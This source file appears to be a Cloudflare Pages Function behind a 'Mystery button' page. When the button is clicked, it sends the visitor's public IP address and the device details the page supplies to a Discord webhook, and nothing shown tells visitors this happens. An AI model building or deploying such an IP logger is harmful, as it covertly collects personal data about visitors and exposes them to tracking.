export async function onRequest(context) {
  const method = context.request.method;

  // Easy test: opening /api/button-click in a browser should work.
  if (method === "GET") {
    return new Response(
      JSON.stringify({
        ok: true,
        message: "Mystery button API is online"
      }),
      {
        status: 200,
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-store"
        }
      }
    );
  }

  if (method !== "POST") {
    return new Response("Method Not Allowed", {
      status: 405,
      headers: {
        Allow: "GET, POST"
      }
    });
  }

  // Your Discord webhook stays safely inside Cloudflare.
  const webhook = context.env.DISCORD_WEBHOOK_URL;

  if (!webhook) {
    return new Response(
      JSON.stringify({
        ok: false,
        error: "DISCORD_WEBHOOK_URL is not configured"
      }),
      {
        status: 500,
        headers: {
          "Content-Type": "application/json"
        }
      }
    );
  }

  try {
    const body = await context.request.json();
    const deviceInfo = body?.deviceInfo || {};

    // Cloudflare provides the visitor's public IP.
    const ip =
      context.request.headers.get("CF-Connecting-IP") ||
      deviceInfo.IP ||
      "Unavailable";

    const fields = [
      {
        name: "IP Address",
        value: String(ip),
        inline: true
      }
    ];

    // Add the browser/device information sent by the website.
    for (const [name, value] of Object.entries(deviceInfo)) {
      if (name === "IP") continue;

      fields.push({
        name: String(name).slice(0, 256),
        value: String(value).slice(0, 1024),
        inline: true
      });
    }

    // Discord allows a maximum of 25 embed fields.
    const discordPayload = {
      content: "button clicked",
      embeds: [
        {
          title: "🔴 Mystery Button Clicked",
          fields: fields.slice(0, 25),
          timestamp: new Date().toISOString()
        }
      ]
    };

    const discordResponse = await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(discordPayload)
    });

    if (!discordResponse.ok) {
      const errorText = await discordResponse.text();

      return new Response(
        JSON.stringify({
          ok: false,
          error: `Discord returned ${discordResponse.status}`,
          details: errorText.slice(0, 500)
        }),
        {
          status: 502,
          headers: {
            "Content-Type": "application/json"
          }
        }
      );
    }

    return new Response(
      JSON.stringify({
        ok: true
      }),
      {
        status: 200,
        headers: {
          "Content-Type": "application/json",
          "Cache-Control": "no-store"
        }
      }
    );
  } catch (error) {
    console.error("Mystery button error:", error);

    return new Response(
      JSON.stringify({
        ok: false,
        error: "Invalid request"
      }),
      {
        status: 400,
        headers: {
          "Content-Type": "application/json"
        }
      }
    );
  }
}
